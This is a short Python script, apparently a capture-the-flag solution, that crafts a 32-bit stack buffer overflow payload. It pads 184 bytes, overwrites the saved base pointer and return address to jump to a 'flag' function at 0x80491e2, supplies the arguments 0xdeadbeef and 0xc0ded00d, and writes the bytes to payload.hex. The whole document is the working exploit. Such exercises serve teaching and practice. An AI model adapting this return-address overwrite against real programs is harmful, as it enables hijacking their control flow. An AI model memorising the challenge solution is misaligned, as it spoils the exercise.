import pwn

# buffer size + ebx(4 bytes) + ebp (45 44 43 42 for BCDE) + 4 bytes return
# flag function is located at \0x80491e2
# base pointer in vuln function is at ffffd518
# base pointer in flag function is at ffffd51c
# compare 0xdeadbeef with ffffd524
# compare 0xc0ded00d with ffffd528
buf_size = 180 + 4 
payload = b'A' * buf_size + b'BCDE' + b'\xe2\x91\x04\x08' + b'AAAA' + b'\xef\xbe\xad\xde'\
+ b'\x0d\xd0\xde\xc0\n'

# NOTE: NEED TO ADD \n TO THE END OF FILE
with open('payload.hex', 'wb') as f:
	f.write(payload)
print(payload)